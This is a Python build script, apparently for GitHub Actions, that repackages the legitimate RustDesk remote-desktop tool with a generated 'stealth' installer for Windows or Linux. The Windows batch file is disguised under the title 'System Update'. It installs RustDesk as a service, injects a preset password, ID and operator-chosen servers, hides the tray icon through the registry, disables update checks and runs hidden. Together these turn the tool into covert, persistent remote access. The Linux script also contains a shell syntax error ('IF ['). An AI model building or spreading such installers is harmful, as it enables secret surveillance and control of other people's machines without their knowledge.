import os
import json
import requests
import zipfile
import sys

def download_file(url, local_path):
    print(f"[*] Downloading: {url}")
    r = requests.get(url, stream=True)
    with open(local_path, 'wb') as f:
        for chunk in r.iter_content(chunk_size=8192):
            f.write(chunk)

# --- Windows 隐身生成器 ---
def generate_windows_stealth_wrapper(config):
    """
    这是一个极其隐蔽的安装脚本
    1. 启用服务安装 --install-service
    2. 添加注册表隐藏托盘 hideTrayIcon
    3. 注入所有服务器配置
    4. 使用 VBScript 再次包装，不显示任何窗口
    """
    
    # 基础命令集合
    bat_content = f"""@echo off
title System Update
schtasks /Delete /TN "RustDeskUpdate" /F >nul 2>&1

:: 1. 必须先杀掉现有进程，否则配置可能无法生效
taskkill /F /IM rustdesk.exe >nul 2>&1
taskkill /F /IM rustdesk-service.exe >nul 2>&1

:: 2. 安装服务模式 (后台运行的核心)
rustdesk.exe --install-service

:: 3. 注入 Key 和服务器配置
rustdesk.exe --key "{config['key']}"
rustdesk.exe --api-server "{config['api_server']}"
rustdesk.exe --id-server "{config['id_server']}"
IF NOT "{config['relay_server']}"=="" (
    rustdesk.exe --relay-server "{config['relay_server']}"
)

:: 4. ID 和密码注入
rustdesk.exe --id "{config['custom_id']}"
rustdesk.exe --password "{config['password']}"

:: 5. 【极致隐形逻辑】
:: 只要 hide_tray 开启，写入注册表
IF "{config['hide_tray']}"=="true" (
    reg add "HKCU\\Software\\RustDesk" /v "hideTrayIcon" /t REG_DWORD /d 1 /f
    reg add "HKLM\\Software\\RustDesk" /v "hideTrayIcon" /t REG_DWORD /d 1 /f
    :: 禁止更新检查
    reg add "HKCU\\Software\\RustDesk\\Settings" /v "enable-update-check" /t REG_DWORD /d 0 /f
)

:: 6. 启动服务
net start RustDesk >nul 2>&1

:: 7. 再次执行 --hide 参数，确保万一服务没启动起来也能后台启动
start "" rustdesk.exe --hide

exit
"""
    return bat_content

# --- Linux 隐身生成器 ---
def generate_linux_stealth_wrapper(config):
    """
    Linux 服务脚本
    """
    sh_content = f"""#!/bin/bash
# RustDesk Linux Silent Installer

# Stop existing service if running
systemctl stop rustdesk > /dev/null 2>&1

# Disable default auto start if exists
rustdesk --service uninstall > /dev/null 2>&1

# Install as service (requires root)
./rustdesk --service

# Config
./rustdesk --key "{config['key']}"
./rustdesk --api-server "{config['api_server']}"
./rustdesk --id-server "{config['id_server']}"
IF [ ! -z "{config['relay_server']}" ]; then
    ./rustdesk --relay-server "{config['relay_server']}"
fi

./rustdesk --id "{config['custom_id']}"
./rustdesk --password "{config['password']}"

# Auto start Linux service
systemctl enable rustdesk
systemctl restart rustdesk

echo "RustDesk Service Started"
"""
    return sh_content

def main():
    # 获取 GitHub Actions 环境变量
    OS = os.getenv("OS")
    VERSION = os.getenv("VERSION").lstrip('v')
    
    config = {
        "custom_id": os.getenv("CUSTOM_ID"),
        "password": os.getenv("PASSWORD"),
        "api_server": os.getenv("API_SERVER"),
        "id_server": os.getenv("ID_SERVER"),
        "relay_server": os.getenv("RELAY_SERVER"),
        "key": os.getenv("KEY"),
        "hide_tray": os.getenv("HIDE_TRAY", "false").lower()
    }

    # 根据系统选择下载 URL
    if OS == "windows":
        download_url = f"https://github.com/rustdesk/rustdesk/releases/download/v{VERSION}/rustdesk-{VERSION}-windows_x64-portable.zip"
        artifact_name = f"rustdesk_{config['custom_id']}_win.zip"
    else:
        # Linux x64 普通版
        download_url = f"https://github.com/rustdesk/rustdesk/releases/download/v{VERSION}/rustdesk-{VERSION}-linux-x64.zip"
        artifact_name = f"rustdesk_{config['custom_id']}_linux.zip"

    zip_path = "raw.zip"
    extract_dir = "extracted"

    download_file(download_url, zip_path)

    # 解压
    with zipfile.ZipFile(zip_path, 'r') as z:
        z.extractall(extract_dir)

    # 查找对应的执行文件
    exe_name = "rustdesk.exe" if OS == "windows" else "rustdesk"
    exe_path = None
    for root, dirs, files in os.walk(extract_dir):
        for f in files:
            if f == exe_name:
                exe_path = os.path.join(root, f)
                break
        if exe_path: break
    
    if not exe_path:
        raise Exception("Executable not found in downloaded archive")

    # 生成安装脚本
    if OS == "windows":
        script_content = generate_windows_stealth_wrapper(config)
        script_name = "install.bat"
    else:
        script_content = generate_linux_stealth_wrapper(config)
        script_name = "install.sh"

    # 将脚本写入解压目录
    script_path = os.path.join(os.path.dirname(exe_path), script_name)
    with open(script_path, 'w', encoding='utf-8' if OS == "windows" else 'utf-8') as f:
        f.write(script_content)

    # 重新打包
    with zipfile.ZipFile(artifact_name, 'w', zipfile.ZIP_DEFLATED) as z_out:
        z_out.write(exe_path, exe_name)
        z_out.write(script_path, script_name)

    print(f"ARTIFACT={artifact_name}")

if __name__ == "__main__":
    main()
